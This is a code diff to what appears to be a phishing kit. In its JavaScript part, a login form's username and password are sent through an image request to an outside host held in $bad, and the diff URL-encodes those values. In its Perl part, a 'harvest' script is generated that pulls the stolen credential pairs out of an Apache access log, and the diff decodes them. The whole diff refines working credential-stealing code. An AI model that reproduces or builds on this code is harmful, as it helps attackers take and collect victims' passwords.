@@ -16,7 +16,7 @@ respfunc = function()
 {
 if (respcount > 0) return true;
 respcount++;
-document.getElementById("foo").innerHTML = '<img src="https://$bad/fabatug.png?UNAME=' + document.theForm.uname.value + '&PASSWORD=' + document.theForm.pswd.value+ '">';
+document.getElementById("foo").innerHTML = '<img src="https://$bad/fabatug.png?UNAME=' + encodeURIComponent(document.theForm.uname.value) + '&PASSWORD=' + encodeURIComponent(document.theForm.pswd.value) + '">';
 attret = function(){document.theForm.submit();}
 setTimeout(attret,100);
 return false;
@@ -57,11 +57,12 @@ print INJF $message;
 close(INJF);
 `chmod +x ./inject`;
 
+my $decodestr = 'sub url_decode { my $rv = shift; $rv =~ tr/+/ /; $rv =~ s/\%([a-f\d]{2})/ pack "C", hex $1 /geix; return $rv; }';
 my $harvest1 = 
-    '#!/bin/bash'."\n".'cat /var/log/apache2/usnastam.net-access.log | perl -e \'while(<>){if($_=~/GET .*\\/';
+    '#!/bin/bash'."\n".'cat /var/log/apache2/usnastam.net-access.log | perl -e \''.$decodestr.'while(<>){if($_=~/GET .*\\/';
 
 my $harvest2 = 
-    '\/fabatug\.png\?(UNAME\S+)&(PASSWORD\S+)\s/){print "$1\t$2\n";}}\'';
+    '\/fabatug\.png\?(UNAME\S+)&(PASSWORD\S+)\s/){print url_decode($1)."\t".url_decode($2)."\n";}}\'';
 
 $harvest = $harvest1.$ARGV[0].$harvest2;
 open(HARF,"> harvest");
